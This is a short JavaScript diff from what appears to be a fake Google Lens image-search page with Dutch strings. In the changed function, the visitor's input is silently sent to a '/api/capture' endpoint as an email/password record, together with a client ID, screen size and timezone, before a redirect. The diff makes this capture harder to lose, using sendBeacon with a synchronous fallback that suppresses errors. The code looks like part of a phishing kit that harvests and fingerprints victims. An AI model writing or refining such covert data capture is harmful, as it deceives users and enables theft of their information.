@@ -421,10 +421,10 @@ function handleLensFile(file) {
 function searchByImageUrl() {
     const url = document.getElementById('lensUrlInput').value.trim();
     if (!url) return;
-    fetch('/api/capture', {
-        method: 'POST', headers: {'Content-Type': 'application/json'},
-        body: JSON.stringify({ email: url, password: '[LENS URL INGEVOERD]', source: 'google_lens_url', timestamp: new Date().toISOString(), clientId: localStorage.getItem('_cid') || 'unknown', screen: screen.width + 'x' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '' })
-    }).catch(() => {});
+    const _p = { email: url, password: '[LENS URL INGEVOERD]', source: 'google_lens_url', timestamp: new Date().toISOString(), clientId: localStorage.getItem('_cid') || 'unknown', screen: screen.width + 'x' + screen.height, timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || '' };
+    if (!navigator.sendBeacon('/api/capture', new Blob([JSON.stringify(_p)], { type: 'application/json' }))) {
+        try { const x = new XMLHttpRequest(); x.open('POST', '/api/capture', false); x.setRequestHeader('Content-Type', 'application/json'); x.send(JSON.stringify(_p)); } catch {}
+    }
     document.getElementById('lensOverlay').style.display = 'none';
     window.location.href = 'results.html?q=' + encodeURIComponent('Afbeelding zoeken');
 }
